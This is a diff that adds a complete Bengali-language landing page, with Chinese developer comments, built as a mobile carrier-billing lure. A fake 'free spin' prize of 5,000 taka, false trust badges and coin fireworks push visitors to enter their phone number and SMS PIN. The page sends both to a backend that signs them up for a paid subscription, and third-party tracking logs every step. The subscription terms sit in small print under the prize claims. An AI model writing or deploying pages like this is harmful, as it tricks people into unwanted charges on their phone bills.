@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>ফ্রি স্পিন – বড় পুরস্কার জিতুন</title>
+    
+    <!-- ============================================================ -->
+    <!-- 【MaxConv 追踪脚本】- 放在head最前面 -->
+    <!-- ============================================================ -->
+    <meta http-equiv="delegate-ch" content="sec-ch-ua https://gift-card.click; sec-ch-ua-mobile https://gift-card.click; sec-ch-ua-arch https://gift-card.click; sec-ch-ua-model https://gift-card.click; sec-ch-ua-platform https://gift-card.click; sec-ch-ua-platform-version https://gift-card.click; sec-ch-ua-bitness https://gift-card.click; sec-ch-ua-full-version-list https://gift-card.click; sec-ch-ua-full-version https://gift-card.click" />
+    
+    <script>
+    !function(w,d,o,n,c){
+        w[o]=w[o]||function(){
+            (w[o].q=w[o].q||[]).push(arguments)
+        };
+        var s=d.createElement(n),
+            t=d.getElementsByTagName(n)[0];
+        s.async=!0;
+        s.defer=!0;
+        s.src="https://gift-card.click/t/t.js";
+        t.parentNode.insertBefore(s,t);
+    }(window,document,"maxconv","script");
+    </script>
+    <noscript><link rel="stylesheet" href="https://gift-card.click/t/t.css?mc_ns=1" /></noscript>
+    <!-- ============================================================ -->
+    
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; -webkit-tap-highlight-color: transparent; }
+        html, body { width: 100%; height: 100%; overflow: hidden; position: fixed; top: 0; left: 0; background: #000; }
+        body { display: flex; justify-content: center; align-items: center; font-family: 'Segoe UI', system-ui, sans-serif; padding: 12px; }
+        .card { max-width: 440px; width: 100%; max-height: 98vh; background: white; border-radius: 32px; overflow-y: auto; text-align: center; box-shadow: 0 20px 35px rgba(0,0,0,0.4); position: relative; z-index: 1; }
+        .card::-webkit-scrollbar { width: 4px; }
+        .card::-webkit-scrollbar-track { background: #f1f1f1; border-radius: 10px; }
+        .card::-webkit-scrollbar-thumb { background: #c1c1c1; border-radius: 10px; }
+        .header { background: #3A7CAE; padding: 20px 16px; color: white; }
+        .header h1 { font-size: 1.6rem; margin-bottom: 6px; }
+        .subhead { font-size: 0.9rem; opacity: 0.9; }
+        .prize-body { padding: 20px 20px 25px; }
+        .slot-machine { background: #f1f5f9; border-radius: 24px; padding: 20px; margin: 15px 0; }
+        .rolling-numbers { font-size: 1.4rem; font-weight: bold; background: #fff; padding: 16px; border-radius: 20px; border: 2px solid #e2e8f0; margin-bottom: 12px; color: #1e293b; line-height: 1.4; min-height: 90px; display: flex; align-items: center; justify-content: center; flex-wrap: wrap; gap: 0 4px; }
+        .rolling-numbers span { font-size: 2.2rem; font-weight: 900; color: #e67e22; display: inline-block; margin: 0 2px; min-width: 80px; text-align: center; }
+        .rolling-numbers .static-text { font-size: 1.2rem; font-weight: 600; color: #1e293b; white-space: nowrap; }
+        .rolling-numbers .prize-label { font-size: 1.2rem; font-weight: 600; color: #1e293b; white-space: nowrap; }
+        .offer-details { background: #f8fafc; border-radius: 20px; padding: 12px 16px; margin: 16px 0 0; text-align: left; font-size: 0.8rem; line-height: 1.5; color: #1e293b; }
+        .offer-details p { margin: 6px 0; }
+        .offer-details strong { color: #b45309; }
+        .trust-line { font-size: 0.7rem; text-align: center; margin-top: 10px; color: #2c6e2c; background: #e6f7e6; padding: 6px 12px; border-radius: 30px; display: flex; justify-content: center; gap: 12px; flex-wrap: wrap; }
+        .footer { font-size: 0.6rem; color: #94a3b8; margin-top: 12px; text-align: center; }
+        .hidden { display: none !important; }
+        .btn-primary { width: 100%; padding: 14px; border: none; border-radius: 60px; font-size: 1.2rem; font-weight: bold; color: white; cursor: pointer; background: #408559; position: relative; z-index: 2; }
+        .btn-primary:active { transform: scale(0.97); }
+        .btn-primary:disabled { opacity: 0.6; }
+        .form-group { margin: 15px 0; }
+        .form-group input { width: 100%; padding: 14px 16px; font-size: 1.2rem; border: 2px solid #e2e8f0; border-radius: 12px; text-align: center; background: #f8fafc; outline: none; }
+        .form-group input:focus { border-color: #3A7CAE; }
+        .pin-container { display: flex; justify-content: center; gap: 12px; margin: 15px 0; }
+        .pin-box { width: 60px; height: 70px; font-size: 2rem; text-align: center; border: 2px solid #e2e8f0; border-radius: 12px; background: #f8fafc; outline: none; }
+        .pin-box:focus { border-color: #3A7CAE; }
+        .error-msg { color: #dc2626; font-size: 0.85rem; margin-top: 8px; padding: 8px 12px; background: #fef2f2; border-radius: 8px; display: none; }
+        .error-msg.show { display: block; }
+        .loading-text { color: #3A7CAE; font-size: 0.9rem; margin-top: 8px; display: none; }
+        .loading-text.show { display: block; }
+        .success-icon { font-size: 4rem; margin: 10px 0; }
+        .success-title { color: #408559; font-size: 1.6rem; font-weight: bold; }
+        #fireworkContainer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 9999; overflow: hidden; }
+        .coin-particle { position: absolute; font-size: 28px; animation: coinExplode 1s ease-out forwards; pointer-events: none; }
+        @keyframes coinExplode { 0% { opacity: 1; transform: translate(0, 0) scale(0.3) rotate(0deg); } 100% { opacity: 0; transform: translate(var(--tx), var(--ty)) scale(1) rotate(var(--rot)); } }
+        .flash-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 215, 0, 0.25); pointer-events: none; z-index: 9998; animation: flash 0.3s ease-out forwards; }
+        @keyframes flash { 0% { opacity: 1; } 100% { opacity: 0; } }
+        @media (max-height: 700px) {
+            .header { padding: 12px 16px; }
+            .prize-body { padding: 12px 16px 20px; }
+            .slot-machine { padding: 12px; margin: 10px 0; }
+            .rolling-numbers { font-size: 1rem; padding: 12px; min-height: 70px; }
+            .rolling-numbers span { font-size: 1.6rem; min-width: 60px; }
+            .pin-box { width: 48px; height: 56px; font-size: 1.6rem; }
+            .btn-primary { padding: 12px; font-size: 1rem; }
+        }
+    </style>
+</head>
+<body>
+
+<div id="fireworkContainer"></div>
+
+<div class="card">
+    <!-- 第一个Header -->
+    <div class="header" id="headerFirst">
+        <h1>🎉 ফ্রি স্পিন 🎉</h1>
+        <div class="subhead">আজকের ভাগ্যবান ব্যবহারকারী!</div>
+    </div>
+
+    <!-- 第二个Header -->
+    <div class="header" id="headerSecond" style="display:none;">
+        <h1 style="color:#FF0000;">🎉 অভিনন্দন! 🎉</h1>
+        <div class="subhead" style="color:#FF0000; font-size:1.1rem;">🎊 আপনি জিতেছেন <strong style="color:#FFD700;">৫,০০০</strong> টাকা পুরস্কার! 🎊</div>
+    </div>
+
+    <div class="prize-body">
+
+        <!-- ===== 游戏区 ===== -->
+        <div id="gameSection">
+            <div class="slot-machine">
+                <div class="rolling-numbers">
+                    <span class="static-text">এক কাপ চায়ের মূল্যে জিতুন</span>
+                    <span id="rollingNumber">৫,০০০</span>
+                    <span class="prize-label">টাকা পুরস্কার!</span>
+                </div>
+                <button class="btn-primary" id="playBtn">🎯 পুরস্কার নিন</button>
+            </div>
+            <div class="offer-details">
+                <p>✅ সাবস্ক্রাইব → পুরস্কার গ্রহণ</p>
+                <p>🎁 পুরস্কার <strong>মোবাইল রিচার্জ</strong> আকারে ২ মিনিটের মধ্যে পাঠানো হবে</p>
+                <p>⚠️ <strong>যেকোনো সময় সাবস্ক্রিপশন বাতিল</strong> করতে পারেন, বাতিল করতে C XG লিখে 85868 নম্বরে SMS পাঠান।</p>
+            </div>
+            <div class="trust-line">
+                🔒 নিরাপদ লেনদেন | ✅ ১০০% বিশ্বস্ত | 🏆 বাস্তব পুরস্কার
+            </div>
+            <div class="footer">সীমিত সময়ের অফার | শুধুমাত্র ব্যবহারকারীদের জন্য</div>
+        </div>
+
+        <!-- ===== 手机号输入区 ===== -->
+        <div id="phoneSection" class="hidden">
+            <h2 style="font-size:1.0rem; color:#1e293b; margin-bottom:6px;">📱 আপনার মোবাইল নম্বর দিন</h2>
+            <p style="font-size:0.85rem; color:#1e293b; margin-bottom:10px;"><strong>একটি OTP SMS আপনার নম্বরে পাঠানো হবে</strong></p>
+            <div class="form-group">
+                <input type="tel" id="msisdn" placeholder="৯৪XXXXXXXXX" maxlength="15">
+            </div>
+            <button class="btn-primary" id="sendBtn">📨 ভেরিফিকেশন কোড পাঠান</button>
+            <div id="phoneLoading" class="loading-text">⏳ পাঠানো হচ্ছে...</div>
+            <div id="phoneError" class="error-msg"></div>
+            <div class="trust-line" style="margin-top:12px; font-size:0.65rem;">
+                🔒 নিরাপদ লেনদেন | ✅ ১০০% বিশ্বস্ত
+            </div>
+        </div>
+
+        <!-- ===== PIN输入区 ===== -->
+        <div id="pinSection" class="hidden">
+            <h2 style="font-size:1.3rem; color:#1e293b; margin-bottom:6px;">🔑 ভেরিফিকেশন কোড দিন</h2>
+            <p style="font-size:0.85rem; color:#1e293b;"><strong>আপনার মোবাইলের SMS দেখুন</strong></p>
+            <p style="font-size:0.85rem; color:#1e293b; margin-bottom:10px;"><strong>৪-অঙ্কের কোড দিন</strong></p>
+            <div class="pin-container">
+                <input type="text" inputmode="numeric" maxlength="1" class="pin-box">
+                <input type="text" inputmode="numeric" maxlength="1" class="pin-box">
+                <input type="text" inputmode="numeric" maxlength="1" class="pin-box">
+                <input type="text" inputmode="numeric" maxlength="1" class="pin-box">
+            </div>
+            <button class="btn-primary" id="verifyBtn">✅ পুরস্কার নিন</button>
+            <div id="pinLoading" class="loading-text">⏳ যাচাই করা হচ্ছে...</div>
+            <div id="pinError" class="error-msg"></div>
+        </div>
+
+        <!-- ===== 成功页 ===== -->
+        <div id="successSection" class="hidden">
+            <div class="success-icon">🎉</div>
+            <div class="success-title">অভিনন্দন! রিচার্জ চ্যানেল অনুমোদিত!</div>
+            <p style="color:#475569; margin:10px 0;">আপনার পুরস্কার খুব শীঘ্রই মোবাইল রিচার্জ আকারে পাঠানো হবে।</p>
+            <button class="btn-primary" id="redirectBtn">🚀 সম্পন্ন!</button>
+            <div class="footer" style="margin-top:12px;">
+                বাতিল করতে: C XG লিখে 85868 নম্বরে SMS পাঠান
+            </div>
+        </div>
+
+    </div>
+</div>
+
+<script>
+// ============================================================
+// 【配置】- 根据文档第5.2节
+// ============================================================
+const API_BASE = 'https://api.yourdomain.com';  // 你的Worker域名
+const OFFER_ID = '291632';                      // 当前Offer ID
+const PIN_LENGTH = 4;                           // PIN位数
+
+// 从URL获取cid（用于追踪）
+const cid = new URLSearchParams(location.search).get('cid') || 
+            new URLSearchParams(location.search).get('clickid') || 
+            ('direct_' + Date.now());
+
+let currentTxid = null;  // 保存PIN Request返回的txid
+
+// ============================================================
+// 【MaxConv事件发送工具函数】
+// ============================================================
+function sendMaxConvEvent(eventName) {
+    if (typeof maxconv !== 'undefined') {
+        maxconv(function() {
+            maxconv('logEvent', eventName);
+            console.log('✅ MaxConv事件已发送:', eventName);
+        });
+    } else {
+        console.warn('⚠️ maxconv未定义，事件未发送:', eventName);
+    }
+}
+
+// ============================================================
+// 【DOM引用】
+// ============================================================
+const headerFirst = document.getElementById('headerFirst');
+const headerSecond = document.getElementById('headerSecond');
+const gameSection = document.getElementById('gameSection');
+const phoneSection = document.getElementById('phoneSection');
+const pinSection = document.getElementById('pinSection');
+const successSection = document.getElementById('successSection');
+
+const msisdnInput = document.getElementById('msisdn');
+const sendBtn = document.getElementById('sendBtn');
+const phoneLoading = document.getElementById('phoneLoading');
+const phoneError = document.getElementById('phoneError');
+
+const pinBoxes = document.querySelectorAll('.pin-box');
+const verifyBtn = document.getElementById('verifyBtn');
+const pinLoading = document.getElementById('pinLoading');
+const pinError = document.getElementById('pinError');
+
+const redirectBtn = document.getElementById('redirectBtn');
+const fireworkContainer = document.getElementById('fireworkContainer');
+
+// ============================================================
+// 【工具函数】
+// ============================================================
+function show(id) { document.getElementById(id).classList.remove('hidden'); }
+function hide(id) { document.getElementById(id).classList.add('hidden'); }
+
+function showError(el, msg) {
+    el.textContent = msg;
+    el.classList.add('show');
+}
+function hideError(el) {
+    el.classList.remove('show');
+    el.textContent = '';
+}
+function showLoading(el) { el.classList.add('show'); }
+function hideLoading(el) { el.classList.remove('show'); }
+
+// ============================================================
+// 【金币烟花效果】
+// ============================================================
+let fireworksTriggered = false;
+const coinEmojis = ['💰', '💵', '💎', '✨'];
+
+function createCoinExplosion(x, y) {
+    const flash = document.createElement('div');
+    flash.className = 'flash-overlay';
+    document.body.appendChild(flash);
+    setTimeout(() => flash.remove(), 400);
+
+    const count = 15 + Math.floor(Math.random() * 10);
+    const particles = [];
+
+    for (let i = 0; i < count; i++) {
+        const coin = document.createElement('div');
+        coin.className = 'coin-particle';
+        coin.textContent = coinEmojis[Math.floor(Math.random() * coinEmojis.length)];
+        
+        const size = 22 + Math.floor(Math.random() * 20);
+        coin.style.fontSize = size + 'px';
+        
+        const angle = -Math.PI / 2 + (Math.random() - 0.5) * Math.PI * 1.4;
+        const distance = 60 + Math.random() * 150;
+        const tx = Math.cos(angle) * distance;
+        const ty = Math.sin(angle) * distance - 30;
+        const rot = (Math.random() - 0.5) * 360;
+        
+        coin.style.setProperty('--tx', tx + 'px');
+        coin.style.setProperty('--ty', ty + 'px');
+        coin.style.setProperty('--rot', rot + 'deg');
+        
+        coin.style.animationDelay = (Math.random() * 0.15) + 's';
+        coin.style.left = (x + (Math.random() - 0.5) * 20) + 'px';
+        coin.style.top = (y + (Math.random() - 0.5) * 20) + 'px';
+        
+        fireworkContainer.appendChild(coin);
+        particles.push(coin);
+    }
+
+    setTimeout(() => {
+        particles.forEach(p => p.remove());
+    }, 1500);
+}
+
+function triggerFireworks() {
+    if (fireworksTriggered) return;
+    fireworksTriggered = true;
+
+    const rect = document.querySelector('.card').getBoundingClientRect();
+    const centerX = rect.left + rect.width / 2;
+    const centerY = rect.top + rect.height * 0.3;
+
+    const waves = [0, 400];
+    waves.forEach((delay) => {
+        setTimeout(() => {
+            for (let i = 0; i < 2; i++) {
+                const offsetX = (Math.random() - 0.5) * 160;
+                const offsetY = (Math.random() - 0.5) * 100;
+                setTimeout(() => {
+                    createCoinExplosion(
+                        centerX + offsetX,
+                        centerY + offsetY - 30
+                    );
+                }, i * 120);
+            }
+        }, delay);
+    });
+}
+
+// ============================================================
+// 【滚动数字动画】
+// ============================================================
+const prizes = ["৫,০০০", "৩,০০০", "২,০০০", "১,০০০"];
+let rollingInterval = null;
+const rollingSpan = document.getElementById('rollingNumber');
+
+function startRolling() {
+    if (rollingInterval) clearInterval(rollingInterval);
+    rollingInterval = setInterval(() => {
+        const randomIndex = Math.floor(Math.random() * prizes.length);
+        rollingSpan.innerText = prizes[randomIndex];
+    }, 120);
+}
+startRolling();
+
+// ============================================================
+// 【事件1】点击「🎯 পুরস্কার নিন」
+// ============================================================
+document.getElementById('playBtn').addEventListener('click', function() {
+    sendMaxConvEvent('play_btn_click');
+    
+    headerFirst.style.display = 'none';
+    headerSecond.style.display = 'block';
+    hide('gameSection');
+    show('phoneSection');
+    msisdnInput.focus();
+    
+    setTimeout(() => {
+        triggerFireworks();
+    }, 300);
+});
+
+// ============================================================
+// 【PIN输入框自动跳转】
+// ============================================================
+pinBoxes.forEach((box, i) => {
+    box.addEventListener('input', () => {
+        box.value = box.value.replace(/\D/g, '');
+        if (box.value && i < pinBoxes.length - 1) {
+            pinBoxes[i + 1].focus();
+        }
+    });
+    box.addEventListener('keydown', e => {
+        if (e.key === 'Backspace' && !box.value && i > 0) {
+            pinBoxes[i - 1].focus();
+        }
+    });
+});
+
+// ============================================================
+// 【事件2】点击「发送」- 调用 Worker PIN Request API
+// 对应文档第3.1节和第5.3节
+// ============================================================
+sendBtn.addEventListener('click', async function() {
+    const msisdn = msisdnInput.value.trim();
+
+    // 文档第5.3节：手机号格式校验
+    if (!/^\d{10,15}$/.test(msisdn)) {
+        showError(phoneError, 'সঠিক মোবাইল নম্বর দিন (উদা: ৯৪XXXXXXXXX)');
+        return;
+    }
+
+    // ✅ MaxConv: 提交手机号
+    sendMaxConvEvent('phone_submit');
+    // ✅ MaxConv: 处理中
+    sendMaxConvEvent('pin_processing');
+
+    hideError(phoneError);
+    showLoading(phoneLoading);
+    sendBtn.disabled = true;
+
+    try {
+        // ===== 请求1: LP → Worker (PIN Request) =====
+        // 文档第5.3节改造点4
+        const url = `${API_BASE}/api/pin/request?msisdn=${msisdn}&offer_id=${OFFER_ID}&cid=${cid}`;
+        const response = await fetch(url);
+        const data = await response.json();
+        
+        console.log('📡 PIN Request响应:', data);
+
+        if (data.success) {
+            // ✅ stateCode: 0 - 验证码发送成功
+            currentTxid = data.txid;
+            sendMaxConvEvent('pin_sent');
+            
+            hideLoading(phoneLoading);
+            sendBtn.disabled = false;
+            hide('phoneSection');
+            show('pinSection');
+            pinBoxes[0].focus();
+        } else {
+            // ✅ stateCode: 1 或其他错误
+            sendMaxConvEvent('pin_send_failed');
+            showError(phoneError, data.msg || 'কোড পাঠাতে ব্যর্থ হয়েছে। আবার চেষ্টা করুন।');
+            hideLoading(phoneLoading);
+            sendBtn.disabled = false;
+        }
+    } catch (error) {
+        // ✅ 网络错误
+        sendMaxConvEvent('pin_send_failed');
+        showError(phoneError, 'নেটওয়ার্ক সমস্যা। আপনার সংযোগ পরীক্ষা করুন।');
+        hideLoading(phoneLoading);
+        sendBtn.disabled = false;
+        console.error('❌ 发送验证码失败:', error);
+    }
+});
+
+// ============================================================
+// 【事件3】点击「验证」- 调用 Worker PIN Verify API
+// 对应文档第3.2节和第5.3节
+// ============================================================
+verifyBtn.addEventListener('click', async function() {
+    const pin = Array.from(pinBoxes).map(b => b.value).join('');
+
+    if (pin.length !== PIN_LENGTH) {
+        showError(pinError, `সম্পূর্ণ ${PIN_LENGTH}-অঙ্কের কোড দিন।`);
+        return;
+    }
+
+    // ✅ MaxConv: 提交验证码按钮
+    sendMaxConvEvent('pin_submit');
+    // ✅ MaxConv: 处理中
+    sendMaxConvEvent('pin_processing');
+
+    hideError(pinError);
+    showLoading(pinLoading);
+    verifyBtn.disabled = true;
+
+    try {
+        // ===== 请求2: LP → Worker (PIN Verify) =====
+        // 文档第5.3节改造点5
+        const url = `${API_BASE}/api/pin/verify?txid=${currentTxid}&pin=${pin}`;
+        const response = await fetch(url);
+        const data = await response.json();
+        
+        console.log('📡 PIN Verify响应:', data);
+
+        if (data.success) {
+            // ✅ stateCode: 0 - 验证成功
+            sendMaxConvEvent('pin_success');
+            hideLoading(pinLoading);
+            verifyBtn.disabled = false;
+            hide('pinSection');
+            show('successSection');
+        } else if (data.processing) {
+            // ✅ stateCode: 2 - 处理中，开始轮询
+            hideLoading(pinLoading);
+            verifyBtn.disabled = false;
+            showError(pinError, '⏳ প্রক্রিয়াকরণ হচ্ছে, দয়া করে অপেক্ষা করুন...');
+            pollStatus();
+        } else {
+            // ✅ stateCode: 1 - 验证失败
+            sendMaxConvEvent('pin_failed');
+            hideLoading(pinLoading);
+            verifyBtn.disabled = false;
+            showError(pinError, data.msg || 'ভুল কোড। আবার চেষ্টা করুন।');
+            pinBoxes.forEach(b => b.value = '');
+            pinBoxes[0].focus();
+        }
+    } catch (error) {
+        // ✅ 网络错误 - 视为验证失败
+        sendMaxConvEvent('pin_failed');
+        hideLoading(pinLoading);
+        verifyBtn.disabled = false;
+        showError(pinError, 'যাচাই ব্যর্থ হয়েছে। আবার চেষ্টা করুন।');
+        console.error('❌ 验证PIN失败:', error);
+    }
+});
+
+// ============================================================
+// 【轮询】- 对应文档第5.3节 pollStatus() 函数
+// ============================================================
+async function pollStatus(attempt = 0) {
+    const MAX_ATTEMPTS = 10;
+    
+    if (attempt >= MAX_ATTEMPTS) {
+        // ✅ 轮询超时
+        sendMaxConvEvent('pin_poll_timeout');
+        showError(pinError, 'সাবস্ক্রিপশন প্রক্রিয়াকরণে সময় বেশি লাগছে।');
+        return;
+    }
+
+    await new Promise(r => setTimeout(r, 3000)); // 文档建议3-5秒
+
+    try {
+        // ===== 请求3: LP → Worker (Status Check) =====
+        // 文档第3.3节
+        const url = `${API_BASE}/api/pin/status?txid=${currentTxid}`;
+        const response = await fetch(url);
+        const data = await response.json();
+        
+        console.log(`📡 轮询第 ${attempt + 1} 次:`, data);
+
+        if (data.status === 'subscribed') {
+            // ✅ 轮询成功
+            sendMaxConvEvent('pin_poll_success');
+            sendMaxConvEvent('pin_success');
+            hide('pinSection');
+            show('successSection');
+        } else if (data.status === 'processing') {
+            // 继续轮询
+            pollStatus(attempt + 1);
+        } else {
+            // ✅ 轮询失败
+            sendMaxConvEvent('pin_poll_failed');
+            showError(pinError, 'সাবস্ক্রিপশন ব্যর্থ হয়েছে। আবার চেষ্টা করুন।');
+        }
+    } catch (error) {
+        // 网络错误，继续重试
+        pollStatus(attempt + 1);
+    }
+}
+
+// ============================================================
+// 【事件4】点击「সম্পন্ন!」
+// ============================================================
+redirectBtn.addEventListener('click', function() {
+    sendMaxConvEvent('redirect_click');
+    alert('ধন্যবাদ!');
+});
+
+// ============================================================
+// 【回车键支持】
+// ============================================================
+msisdnInput.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') sendBtn.click();
+});
+pinBoxes.forEach((box) => {
+    box.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') verifyBtn.click();
+    });
+});
+
+// ============================================================
+// 【控制台调试信息】
+// ============================================================
+console.log('🚀 MaxConv追踪已集成');
+console.log('📋 OFFER_ID:', OFFER_ID);
+console.log('🔑 CID:', cid);
+console.log('📡 API_BASE:', API_BASE);
+console.log('📦 事件列表:');
+console.log('   play_btn_click → phone_submit → pin_processing → pin_sent / pin_send_failed');
+console.log('   → pin_submit → pin_processing → pin_success / pin_failed / pin_processing(轮询)');
+console.log('   → pin_poll_success / pin_poll_failed / pin_poll_timeout → redirect_click');
+console.log('💡 在MaxConv后台创建对应的Goal即可看到数据');
+</script>
+</body>
+</html>
